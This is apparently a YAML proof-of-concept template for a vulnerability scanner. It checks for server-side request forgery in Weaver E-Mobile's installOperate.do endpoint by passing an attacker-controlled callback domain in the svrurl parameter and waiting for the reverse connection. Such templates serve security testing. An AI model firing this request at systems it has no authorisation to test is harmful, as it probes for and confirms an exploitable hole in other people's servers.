name: poc-yaml-Weaver-E-Mobile-installOperate-ssrf
transport: http

set:
  reverse: newReverse()
  reverseDomain: reverse.domain


rules:
  r0:
    request:
      method: GET
      path: /install/installOperate.do?svrurl=http://{{reverseDomain}}
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
    expression: reverse.wait(1)


expression: r0() 


detail:
  author: Superhero
  links:
    - https://blog.csdn.net/m0_60571842/article/details/140707041
